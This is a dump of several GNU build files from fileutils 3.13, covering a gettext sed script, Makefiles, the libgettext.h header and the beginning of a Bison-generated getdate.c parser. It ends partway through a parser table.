GNU gettext library from gettext-0.10.23
1 {
  i\
/* Automatically generated by po2tbl.sed from @PACKAGE NAME@.pot.  */\
\
#if HAVE_CONFIG_H\
# include <config.h>\
#endif\
\
#include "libgettext.h"\
\
const struct _msg_ent _msg_tbl[] = {
  h
  s/.*/0/
  x
}
/^msgid/ {
  s/msgid[ 	]*\(".*"\)/  {\1/
  tb
  :b
  N
  s/\(.*\)"\(\n\)"\(.*"\)/\1\2\3/
  ta
  s/\(.*\)\n.*/\1/
  bc
  :a
  s/\(.*\)\(\n.*\)/\1\\\2/
  P
  s/.*\n\(.*\)/\1/
  tb
  :c
  x
  td
  :d
  s/9\(_*\)$/_\1/
  td
  s/^\(_*\)$/0\1/
  s/8\(_*\)$/9\1/
  s/7\(_*\)$/8\1/
  s/6\(_*\)$/7\1/
  s/5\(_*\)$/6\1/
  s/4\(_*\)$/5\1/
  s/3\(_*\)$/4\1/
  s/2\(_*\)$/3\1/
  s/1\(_*\)$/2\1/
  s/0\(_*\)$/1\1/
  s/_/0/g
  x
  G
  s/\(.*\)\n\([0-9]*\)/\1, \2},/
  s/\(.*\)"$/\1/
  p
}
$ {
  i\
};\

  g
  s/0*\(.*\)/int _msg_tbl_length = \1;/p
}
d
# Generated automatically from Makefile.in by configure.
# Makefile for directory with message catalog handling in GNU NLS Utilities.
# Copyright (C) 1995, 1996 Free Software Foundation, Inc.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

PACKAGE = fileutils
VERSION = 3.13

SHELL = /bin/sh

srcdir = .
top_srcdir = ..

prefix = /usr/local
exec_prefix = ${prefix}
transform = s,x,x,
libdir = $(prefix)/lib
includedir = $(prefix)/include
datadir = $(prefix)/share
localedir = $(datadir)/locale
gnulocaledir = $(prefix)/share/locale
gettextsrcdir = ${prefix}/share/gettext/intl
aliaspath = $(localedir):.
subdir = intl

INSTALL = /usr/bin/ginstall -c
INSTALL_DATA = ${INSTALL} -m 644
MKINSTALLDIRS = ./mkinstalldirs

AR = ar
CC = gcc
RANLIB = ranlib

DEFS = -DLOCALEDIR=\"$(localedir)\" -DGNULOCALEDIR=\"$(gnulocaledir)\" \
-DLOCALE_ALIAS_PATH=\"$(aliaspath)\" -DHAVE_CONFIG_H
CFLAGS = -g -O

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS) $(XCFLAGS)

HEADERS = $(COMHDRS) libgettext.h loadinfo.h
COMHDRS = gettext.h gettextP.h hash-string.h
SOURCES = $(COMSRCS) intl-compat.c cat-compat.c
COMSRCS = bindtextdom.c dcgettext.c dgettext.c gettext.c \
finddomain.c loadmsgcat.c localealias.c textdomain.c l10nflist.c \
explodename.c
OBJECTS = $(GETTOBJS) bindtextdom.o dcgettext.o dgettext.o gettext.o \
finddomain.o loadmsgcat.o localealias.o textdomain.o l10nflist.o \
explodename.o
CATOBJS = cat-compat.o ../po/cat-id-tbl.o
GETTOBJS = intl-compat.o
DISTFILES.common = ChangeLog linux-msg.sed po2tbl.sed.in \
xopen-msg.sed $(HEADERS) $(SOURCES)
DISTFILES.normal = VERSION
DISTFILES.gettext = libintl.glibc intlh.inst.in

.SUFFIXES:
.SUFFIXES: .c .o
.c.o:
	$(COMPILE) $<

INCLUDES = -I.. -I. -I$(top_srcdir)/intl -I$(top_srcdir)/lib

all: all-yes

all-yes: libintl.a intlh.inst
all-no:

libintl.a: $(OBJECTS)
	rm -f $@
	$(AR) cru $@ $(OBJECTS)
	$(RANLIB) $@

../po/cat-id-tbl.o: ../po/cat-id-tbl.c $(top_srcdir)/po/$(PACKAGE).pot
	cd ../po && $(MAKE) cat-id-tbl.o

check: all

# This installation goal is only used in GNU gettext.  Packages which
# only use the library should use install instead.

# We must not install the libintl.h/libintl.a files if we are on a
# system which has the gettext() function in its C library or in a
# separate library or use the catgets interface.  A special case is
# where configure found a previously installed GNU gettext library.
# If you want to use the one which comes with this version of the
# package, you have to use `configure --with-included-gettext'.
install: all
	if test "$(PACKAGE)" = "gettext"; then \
	  if test -r $(MKINSTALLDIRS); then \
	    $(MKINSTALLDIRS) $(libdir) $(includedir) $(gettextsrcdir); \
	  else \
	    $(top_srcdir)/mkinstalldirs $(libdir) $(includedir) \
	      $(gettextsrcdir); \
	  fi; \
	  if test '$(GETTOBJS)' = '$(GETTOBJS)'; then \
	    $(INSTALL_DATA) intlh.inst $(includedir)/libintl.h; \
	    $(INSTALL_DATA) libintl.a $(libdir)/libintl.a; \
	  fi; \
	  $(INSTALL_DATA) VERSION $(gettextsrcdir)/VERSION; \
	  cd $(srcdir) && \
	  for file in $(DISTFILES.common); do \
	    $(INSTALL_DATA) $$file $(gettextsrcdir)/$$file; \
	  done; \
	else \
	  : ; \
	fi

# Define this as empty until I found a useful application.
installcheck:

uninstall:
	for file in $(DISTFILES); do \
	  rm -f $(gettextsrcdir)/intl-$$file; \
	done

info dvi:

$(OBJECTS): ../config.h libgettext.h
bindtextdom.o finddomain.o loadmsgcat.o: gettextP.h gettext.h loadinfo.h
dcgettext.o: gettextP.h gettext.h hash-string.h loadinfo.h

tags: TAGS

TAGS: $(HEADERS) $(SOURCES)
	here=`pwd`; cd $(srcdir) && etags -o $$here/TAGS $(HEADERS) $(SOURCES)

id: ID

ID: $(HEADERS) $(SOURCES)
	here=`pwd`; cd $(srcdir) && mkid -f$$here/ID $(HEADERS) $(SOURCES)


mostlyclean:
	rm -f *.a *.o core core.*

clean: mostlyclean

distclean: clean
	rm -f Makefile ID TAGS po2msg.sed po2tbl.sed libintl.h

maintainer-clean: distclean
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."


# GNU gettext needs not contain the file `VERSION' but contains some
# other files which should not be distributed in other packages.
distdir = ../$(PACKAGE)-$(VERSION)/$(subdir)
dist distdir: Makefile $(DISTFILES)
	if test "$(PACKAGE)" = gettext; then \
	  additional="$(DISTFILES.gettext)"; \
	else \
	  additional="$(DISTFILES.normal)"; \
	fi; \
	for file in $(DISTFILES.common) $$additional; do \
	  ln $(srcdir)/$$file $(distdir) 2> /dev/null \
	    || cp -p $(srcdir)/$$file $(distdir); \
	done

dist-libc:
	tar zcvf intl-glibc.tar.gz $(COMSRCS) $(COMHDRS) libintl.h.glibc

# The dependency for intlh.inst is different in gettext and all other
# packages.  Because we cannot you GNU make features we have to solve
# the problem while rewriting Makefile.in.
#YES#intlh.inst: intlh.inst.in ../config.status
#YES#	cd .. \
#YES#	&& CONFIG_FILES=$(subdir)/$@ CONFIG_HEADERS= \
#YES#	  $(SHELL) ./config.status
.PHONY: intlh.inst
intlh.inst:

# Tell versions [3.59,3.63) of GNU make not to export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
/* libgettext.h -- Message catalogs for internationalization.
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

/* Because on some systems (e.g. Solaris) we sometimes have to include
   the systems libintl.h as well as this file we have more complex
   include protection above.  But the systems header might perhaps also
   define _LIBINTL_H and therefore we have to protect the definition here.  */

#if !defined (_LIBINTL_H) || !defined (_LIBGETTEXT_H)
#if !defined (_LIBINTL_H)
# define _LIBINTL_H	1
#endif
#define _LIBGETTEXT_H	1

/* We define an additional symbol to signal that we use the GNU
   implementation of gettext.  */
#define __USE_GNU_GETTEXT 1

#include <sys/types.h>

#if HAVE_LOCALE_H
# include <locale.h>
#endif


#ifdef __cplusplus
extern "C" {
#endif

/* @@ end of prolog @@ */

#ifndef PARAMS
# if __STDC__
#  define PARAMS(args) args
# else
#  define PARAMS(args) ()
# endif
#endif

#ifndef NULL
# if !defined __cplusplus || defined __GNUC__
#  define NULL ((void *) 0)
# else
#  define NULL (0)
# endif
#endif

#if !HAVE_LC_MESSAGES
/* This value determines the behaviour of the gettext() and dgettext()
   function.  But some system does not have this defined.  Define it
   to a default value.  */
# define LC_MESSAGES (-1)
#endif


/* Declarations for gettext-using-catgets interface.  Derived from
   Jim Meyering's libintl.h.  */
struct _msg_ent
{
  const char *_msg;
  int _msg_number;
};


#if HAVE_CATGETS
/* These two variables are defined in the automatically by po-to-tbl.sed
   generated file `cat-id-tbl.c'.  */
extern const struct _msg_ent _msg_tbl[];
extern int _msg_tbl_length;
#endif


/* For automatical extraction of messages sometimes no real
   translation is needed.  Instead the string itself is the result.  */
#define gettext_noop(Str) (Str)

/* Look up MSGID in the current default message catalog for the current
   LC_MESSAGES locale.  If not found, returns MSGID itself (the default
   text).  */
extern char *gettext PARAMS ((const char *__msgid));
extern char *gettext__ PARAMS ((const char *__msgid));

/* Look up MSGID in the DOMAINNAME message catalog for the current
   LC_MESSAGES locale.  */
extern char *dgettext PARAMS ((const char *__domainname, const char *__msgid));
extern char *dgettext__ PARAMS ((const char *__domainname,
				 const char *__msgid));

/* Look up MSGID in the DOMAINNAME message catalog for the current CATEGORY
   locale.  */
extern char *dcgettext PARAMS ((const char *__domainname, const char *__msgid,
				int __category));
extern char *dcgettext__ PARAMS ((const char *__domainname,
				  const char *__msgid, int __category));


/* Set the current default message catalog to DOMAINNAME.
   If DOMAINNAME is null, return the current default.
   If DOMAINNAME is "", reset to the default of "messages".  */
extern char *textdomain PARAMS ((const char *__domainname));
extern char *textdomain__ PARAMS ((const char *__domainname));

/* Specify that the DOMAINNAME message catalog will be found
   in DIRNAME rather than in the system locale data base.  */
extern char *bindtextdomain PARAMS ((const char *__domainname,
				  const char *__dirname));
extern char *bindtextdomain__ PARAMS ((const char *__domainname,
				    const char *__dirname));

#if ENABLE_NLS

/* Solaris 2.3 has the gettext function but dcgettext is missing.
   So we omit this optimization for Solaris 2.3.  BTW, Solaris 2.4
   has dcgettext.  */
# if !HAVE_CATGETS && (!HAVE_GETTEXT || HAVE_DCGETTEXT)

#  define gettext(Msgid)						      \
     dgettext (NULL, Msgid)

#  define dgettext(Domainname, Msgid)					      \
     dcgettext (Domainname, Msgid, LC_MESSAGES)

#  if defined __GNUC__ && __GNUC__ == 2 && __GNUC_MINOR__ >= 7
/* This global variable is defined in loadmsgcat.c.  We need a sign,
   whether a new catalog was loaded, which can be associated with all
   translations.  */
extern int _nl_msg_cat_cntr;

#   define dcgettext(Domainname, Msgid, Category)			      \
  (__extension__							      \
   ({									      \
     char *__result;							      \
     if (__builtin_constant_p (Msgid))					      \
       {								      \
	 static char *__translation__;					      \
	 static int __catalog_counter__;				      \
	 if (! __translation__ || __catalog_counter__ != _nl_msg_cat_cntr)    \
	   {								      \
	     __translation__ =						      \
	       dcgettext__ ((Domainname), (Msgid), (Category));		      \
	     __catalog_counter__ = _nl_msg_cat_cntr;			      \
	   }								      \
	 __result = __translation__;					      \
       }								      \
     else								      \
       __result = dcgettext__ ((Domainname), (Msgid), (Category));	      \
     __result;								      \
    }))
#  endif
# endif

#else

# define gettext(Msgid) (Msgid)
# define dgettext(Domainname, Msgid) (Msgid)
# define dcgettext(Domainname, Msgid, Category) (Msgid)
# define textdomain(Domainname) while (0) /* nothing */
# define bindtextdomain(Domainname, Dirname) while (0) /* nothing */

#endif

/* @@ begin of epilog @@ */

#ifdef __cplusplus
}
#endif

#endif
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = @srcdir@
top_srcdir = @top_srcdir@
VPATH = @srcdir@
prefix = @prefix@
exec_prefix = @exec_prefix@

bindir = @bindir@
sbindir = @sbindir@
libexecdir = @libexecdir@
datadir = @datadir@
sysconfdir = @sysconfdir@
sharedstatedir = @sharedstatedir@
localstatedir = @localstatedir@
libdir = @libdir@
infodir = @infodir@
mandir = @mandir@
includedir = @includedir@
oldincludedir = /usr/include

pkgdatadir = $(datadir)/@PACKAGE@
pkglibdir = $(libdir)/@PACKAGE@
pkgincludedir = $(includedir)/@PACKAGE@

top_builddir = ..

INSTALL = @INSTALL@
INSTALL_PROGRAM = @INSTALL_PROGRAM@
INSTALL_DATA = @INSTALL_DATA@
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = @program_transform_name@

noinst_LIBRARIES = fu

EXTRA_DIST = alloca.c basename.c euidaccess.c fnmatch.c fsusage.c \
ftruncate.c getdate.y getopt.c getopt1.c group-member.c \
memcmp.c memcpy.c memset.c \
mkdir.c mktime.c mountlist.c posixtm.y rename.c rmdir.c \
stpcpy.c strcasecmp.c strdup.c strndup.c strstr.c strtol.c strtoul.c

INCLUDES = -I.. -I$(srcdir)

fu_SOURCES = getdate.c getline.c posixtm.c argmatch.c backupfile.c \
dirname.c error.c fileblocks.c filemode.c \
full-write.c getversion.c idcache.c \
isdir.c long-options.c makepath.c modechange.c obstack.c \
safe-read.c save-cwd.c savedir.c stripslash.c userspec.c xgetcwd.c \
xmalloc.c xstrdup.c xstrtol.c xstrtoul.c yesno.c

fu_LIBADD = @LIBOBJS@ @ALLOCA@

noinst_HEADERS = argmatch.h backupfile.h error.h fnmatch.h fsusage.h \
getline.h getopt.h group-member.h long-options.h makepath.h modechange.h \
mountlist.h obstack.h pathmax.h save-cwd.h xstrtol.h xstrtoul.h

BUILT_SOURCES = getdate.c posixtm.c
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
LIBRARIES = $(noinst_LIBRARIES)

noinst_LIBFILES = libfu.a

CC = @CC@
LEX = @LEX@
YACC = @YACC@

DEFS = @DEFS@ -I. -I$(srcdir) -I..
CPPFLAGS = @CPPFLAGS@
CFLAGS = @CFLAGS@
LDFLAGS = @LDFLAGS@
LIBS = @LIBS@

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(LDFLAGS) -o $@
fu_OBJECTS = getdate.o getline.o posixtm.o argmatch.o backupfile.o \
dirname.o error.o fileblocks.o filemode.o full-write.o getversion.o \
idcache.o isdir.o long-options.o makepath.o modechange.o obstack.o \
safe-read.o save-cwd.o savedir.o stripslash.o userspec.o xgetcwd.o \
xmalloc.o xstrdup.o xstrtol.o xstrtoul.o yesno.o
EXTRA_fu_SOURCES =
LIBFILES =  libfu.a
AR = ar
RANLIB = @RANLIB@
HEADERS = $(noinst_HEADERS)

DIST_COMMON = Makefile.am Makefile.in


PACKAGE = @PACKAGE@
VERSION = @VERSION@

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
SOURCES = $(fu_SOURCES)
OBJECTS = $(fu_OBJECTS)

default: all


$(srcdir)/Makefile.in: @MAINT@Makefile.am $(top_srcdir)/configure.in
	cd $(top_srcdir) && automake $(subdir)/Makefile

Makefile: $(top_builddir)/config.status Makefile.in
	cd $(top_builddir) && CONFIG_FILES=$(subdir)/$@ CONFIG_HEADERS= ./config.status

mostlyclean-noinstLIBRARIES:

clean-noinstLIBRARIES:
	rm -f $(noinst_LIBFILES)

distclean-noinstLIBRARIES:

maintainer-clean-noinstLIBRARIES:

.c.o:
	$(COMPILE) $<

mostlyclean-compile:
	rm -f *.o core

clean-compile:

distclean-compile:
	rm -f *.tab.c

maintainer-clean-compile:
$(fu_OBJECTS): ../config.h

libfu.a: $(fu_OBJECTS) $(fu_LIBADD)
	rm -f libfu.a
	$(AR) cru libfu.a $(fu_OBJECTS) $(fu_LIBADD)
	$(RANLIB) libfu.a

ID: $(HEADERS) $(SOURCES)
	here=`pwd` && cd $(srcdir) && mkid -f$$here/ID $(SOURCES) $(HEADERS)

tags: TAGS

TAGS: $(HEADERS) $(SOURCES) $(TAGS_DEPENDENCIES)
	here=`pwd` && cd $(srcdir) && etags $(ETAGS_ARGS) $(SOURCES) $(HEADERS) -o $$here/TAGS

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

subdir = lib
distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)
distdir: $(DEP_DISTFILES)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
alloca.o: alloca.c
argmatch.o: argmatch.c
backupfile.o: backupfile.c backupfile.h
basename.o: basename.c
dirname.o: dirname.c
error.o: error.c
fileblocks.o: fileblocks.c
filemode.o: filemode.c
fnmatch.o: fnmatch.c
fsusage.o: fsusage.c fsusage.h
ftruncate.o: ftruncate.c
full-write.o: full-write.c
getdate.o: getdate.c
getline.o: getline.c
getopt.o: getopt.c
getopt1.o: getopt1.c getopt.h
getversion.o: getversion.c backupfile.h
group-member.o: group-member.c group-member.h
idcache.o: idcache.c
isdir.o: isdir.c
long-options.o: long-options.c long-options.h
makepath.o: makepath.c makepath.h
modechange.o: modechange.c modechange.h
mountlist.o: mountlist.c mountlist.h
obstack.o: obstack.c obstack.h
posixtm.o: posixtm.c
safe-read.o: safe-read.c
save-cwd.o: save-cwd.c ../config.h save-cwd.h error.h
savedir.o: savedir.c
stripslash.o: stripslash.c
userspec.o: userspec.c
xgetcwd.o: xgetcwd.c pathmax.h
xmalloc.o: xmalloc.c
xstrdup.o: xstrdup.c
xstrtol.o: xstrtol.c xstrtol.h
xstrtoul.o: xstrtoul.c xstrtol.c xstrtol.h
yesno.o: yesno.c

info:

dvi:

check: all

installcheck:

install-exec: 

install-data: 

install: install-exec install-data all
	@:

uninstall: 

all: $(LIBFILES) $(HEADERS) Makefile

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs:


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean:  mostlyclean-noinstLIBRARIES mostlyclean-compile \
		mostlyclean-tags mostlyclean-generic

clean:  clean-noinstLIBRARIES clean-compile clean-tags clean-generic \
		mostlyclean 

distclean:  distclean-noinstLIBRARIES distclean-compile distclean-tags \
		distclean-generic clean 
	rm -f config.status

maintainer-clean:  maintainer-clean-noinstLIBRARIES \
		maintainer-clean-compile maintainer-clean-tags \
		maintainer-clean-generic distclean 
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."

.PHONY: default mostlyclean-noinstLIBRARIES distclean-noinstLIBRARIES \
clean-noinstLIBRARIES maintainer-clean-noinstLIBRARIES \
mostlyclean-compile distclean-compile clean-compile \
maintainer-clean-compile tags mostlyclean-tags distclean-tags \
clean-tags maintainer-clean-tags distdir info dvi check installcheck \
install-exec install-data install uninstall all installdirs \
mostlyclean-generic distclean-generic clean-generic \
maintainer-clean-generic clean mostlyclean distclean maintainer-clean


# Since this directory contains two parsers, we have to be careful to avoid
# running two $(YACC)s during parallel makes.  See below.
getdate.c: @MAINT@getdate.y
	@echo expect 10 shift/reduce conflicts
	$(YACC) $(srcdir)/getdate.y
	mv y.tab.c getdate.c

# Make the rename atomic, in case sed is interrupted and later rerun.
# The artificial dependency on getdate.c keeps the two parsers from being
# built in parallel.  Enforcing this little bit of sequentiality lets
# everyone (even those without bison) still run mostly parallel builds.
posixtm.c: @MAINT@posixtm.y getdate.c
	$(YACC) $(srcdir)/posixtm.y
	mv y.tab.c posixtm.tab.c
	sed -e 's/yy/zz/g' posixtm.tab.c > tposixtm.c
	mv tposixtm.c posixtm.c
	rm -f posixtm.tab.c
.SUFFIXES:
.SUFFIXES: .c .o

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
## Process this file with automake to produce Makefile.in
noinst_LIBRARIES = fu

EXTRA_DIST = alloca.c basename.c euidaccess.c fnmatch.c fsusage.c \
ftruncate.c getdate.y getopt.c getopt1.c group-member.c \
memcmp.c memcpy.c memset.c \
mkdir.c mktime.c mountlist.c posixtm.y rename.c rmdir.c \
stpcpy.c strcasecmp.c strdup.c strndup.c strstr.c strtol.c strtoul.c

INCLUDES = -I.. -I$(srcdir)

fu_SOURCES = getdate.c getline.c posixtm.c argmatch.c backupfile.c \
dirname.c error.c fileblocks.c filemode.c \
full-write.c getversion.c idcache.c \
isdir.c long-options.c makepath.c modechange.c obstack.c \
safe-read.c save-cwd.c savedir.c stripslash.c userspec.c xgetcwd.c \
xmalloc.c xstrdup.c xstrtol.c xstrtoul.c yesno.c

fu_LIBADD = @LIBOBJS@ @ALLOCA@

noinst_HEADERS = argmatch.h backupfile.h error.h fnmatch.h fsusage.h \
getline.h getopt.h group-member.h long-options.h makepath.h modechange.h \
mountlist.h obstack.h pathmax.h save-cwd.h xstrtol.h xstrtoul.h

BUILT_SOURCES = getdate.c posixtm.c

# Since this directory contains two parsers, we have to be careful to avoid
# running two $(YACC)s during parallel makes.  See below.
getdate.c: @MAINT@getdate.y
	@echo expect 10 shift/reduce conflicts
	$(YACC) $(srcdir)/getdate.y
	mv y.tab.c getdate.c

# Make the rename atomic, in case sed is interrupted and later rerun.
# The artificial dependency on getdate.c keeps the two parsers from being
# built in parallel.  Enforcing this little bit of sequentiality lets
# everyone (even those without bison) still run mostly parallel builds.
posixtm.c: @MAINT@posixtm.y getdate.c
	$(YACC) $(srcdir)/posixtm.y
	mv y.tab.c posixtm.tab.c
	sed -e 's/yy/zz/g' posixtm.tab.c > tposixtm.c
	mv tposixtm.c posixtm.c
	rm -f posixtm.tab.c

/*  A Bison parser, made from ./getdate.y
 by  GNU Bison version 1.25
  */

#define YYBISON 1  /* Identify Bison output.  */

#define	tAGO	258
#define	tDAY	259
#define	tDAYZONE	260
#define	tID	261
#define	tMERIDIAN	262
#define	tMINUTE_UNIT	263
#define	tMONTH	264
#define	tMONTH_UNIT	265
#define	tSEC_UNIT	266
#define	tSNUMBER	267
#define	tUNUMBER	268
#define	tZONE	269
#define	tDST	270

#line 1 "./getdate.y"

/*
**  Originally written by Steven M. Bellovin <smb@research.att.com> while
**  at the University of North Carolina at Chapel Hill.  Later tweaked by
**  a couple of people on Usenet.  Completely overhauled by Rich $alz
**  <rsalz@bbn.com> and Jim Berets <jberets@bbn.com> in August, 1990;
**  send any email to Rich.
**
**  This grammar has 10 shift/reduce conflicts.
**
**  This code is in the public domain and has no copyright.
*/
/* SUPPRESS 287 on yaccpar_sccsid *//* Unused static variable */
/* SUPPRESS 288 on yyerrlab *//* Label unused */

#ifdef HAVE_CONFIG_H
#include <config.h>

#ifdef FORCE_ALLOCA_H
#include <alloca.h>
#endif
#endif

/* Since the code of getdate.y is not included in the Emacs executable
   itself, there is no need to #define static in this file.  Even if
   the code were included in the Emacs executable, it probably
   wouldn't do any harm to #undef it here; this will only cause
   problems if we try to write to a static variable, which I don't
   think this code needs to do.  */
#ifdef emacs
#undef static
#endif

#include <stdio.h>
#include <ctype.h>

#if	defined (vms)
#include <types.h>
#include <time.h>
#else
#include <sys/types.h>
#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#include <time.h>
#else
#ifdef HAVE_SYS_TIME_H
#include <sys/time.h>
#else
#include <time.h>
#endif
#endif

#ifdef timezone
#undef timezone /* needed for sgi */
#endif

#if defined (HAVE_SYS_TIMEB_H)
#include <sys/timeb.h>
#else

/* get_date uses the obsolete `struct timeb' in its interface!  FIXME.
   Since some systems don't have it, we define it here;
   callers must do likewise.  */
struct timeb
  {
    time_t		time;		/* Seconds since the epoch	*/
    unsigned short	millitm;	/* Field not used		*/
    short		timezone;	/* Minutes west of GMT		*/
    short		dstflag;	/* Field not used		*/
};
#endif /* defined (HAVE_SYS_TIMEB_H) */

#endif	/* defined (vms) */

#if defined (STDC_HEADERS) || defined (USG)
#include <string.h>
#endif

/* Some old versions of bison generate parsers that use bcopy.
   That loses on systems that don't provide the function, so we have
   to redefine it here.  */
#if !defined (HAVE_BCOPY) && defined (HAVE_MEMCPY) && !defined (bcopy)
#define bcopy(from, to, len) memcpy ((to), (from), (len))
#endif

extern struct tm	*gmtime ();
extern struct tm	*localtime ();

#define yyparse getdate_yyparse
#define yylex getdate_yylex
#define yyerror getdate_yyerror

static int yylex ();
static int yyerror ();

#define EPOCH		1970
#define DOOMSDAY	2038
#define HOUR(x)		((time_t)(x) * 60)
#define SECSPERDAY	(24L * 60L * 60L)

#define MAX_BUFF_LEN    128   /* size of buffer to read the date into */

/*
**  An entry in the lexical lookup table.
*/
typedef struct _TABLE {
    const char	*name;
    int		type;
    time_t	value;
} TABLE;


/*
**  Daylight-savings mode:  on, off, or not yet known.
*/
typedef enum _DSTMODE {
    DSTon, DSToff, DSTmaybe
} DSTMODE;

/*
**  Meridian:  am, pm, or 24-hour style.
*/
typedef enum _MERIDIAN {
    MERam, MERpm, MER24
} MERIDIAN;


/*
**  Global variables.  We could get rid of most of these by using a good
**  union as the yacc stack.  (This routine was originally written before
**  yacc had the %union construct.)  Maybe someday; right now we only use
**  the %union very rarely.
*/
static char	*yyInput;
static DSTMODE	yyDSTmode;
static time_t	yyDayOrdinal;
static time_t	yyDayNumber;
static int	yyHaveDate;
static int	yyHaveDay;
static int	yyHaveRel;
static int	yyHaveTime;
static int	yyHaveZone;
static time_t	yyTimezone;
static time_t	yyDay;
static time_t	yyHour;
static time_t	yyMinutes;
static time_t	yyMonth;
static time_t	yySeconds;
static time_t	yyYear;
static MERIDIAN	yyMeridian;
static time_t	yyRelMonth;
static time_t	yyRelSeconds;


#line 156 "./getdate.y"
typedef union {
    time_t		Number;
    enum _MERIDIAN	Meridian;
} YYSTYPE;
#include <stdio.h>

#ifndef __cplusplus
#ifndef __STDC__
#define const
#endif
#endif



#define	YYFINAL		52
#define	YYFLAG		-32768
#define	YYNTBASE	19

#define YYTRANSLATE(x) ((unsigned)(x) <= 270 ? yytranslate[x] : 29)

static const char yytranslate[] = {     0,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,    17,     2,     2,    18,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,    16,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     2,     2,     2,     2,     2,
     2,     2,     2,     2,     2,     1,     2,     3,     4,     5,
     6,     7,     8,     9,    10,    11,    12,    13,    14,    15
};

#if YYDEBUG != 0
static const short yyprhs[] = {     0,
     0,     1,     4,     6,     8,    10,    12,    14,    16,    19,
    24,    29,    36,    43,    45,    47,    50,    52,    55,    58,
    62,    68,    72,    76,    79,    84,    87,    91,    94,    96,
    99,   102,   104,   107,   110,   112,   115,   118,   120,   122,
   123
};

static const short yyrhs[] = {    -1,
    19,    20,     0,    21,     0,    22,     0,    24,     0,    23,
     0,    25,     0,    27,     0,    13,     7,     0,    13,    16,
    13,    28,     0,    13,    16,    13,    12,     0,    13,    16,
    13,    16,    13,    28,     0,    13,    16,    13,    16,    13,
    12,     0,    14,     0,     5,     0,    14,    15,     0,     4,
     0,     4,    17,     0,    13,     4,     0,    13,    18,    13,
     0,    13,    18,    13,    18,    13,     0,    13,    12,    12,
